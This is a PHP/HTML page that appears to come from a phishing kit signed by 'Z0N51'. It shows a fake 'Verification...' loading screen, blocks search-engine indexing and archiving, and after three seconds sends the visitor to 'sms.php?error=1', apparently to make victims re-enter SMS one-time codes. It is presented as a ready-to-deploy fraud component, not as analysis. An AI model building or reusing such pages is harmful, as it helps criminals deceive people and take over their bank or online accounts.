<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

        <link rel="icon" type="image/png" href="../assets/images/fav.png"/>
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <title>Verification...</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="pt-4">
            <div class="container">
                
                <div class="loader text-center mt-5">
                    <img style="max-width: 130px;" src="../assets/images/loading.gif">
                </div>

            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'sms.php?error=1&#_'+ dispatch;
            },3000); // 1000 = 1s
        </script>

    </body>

</html>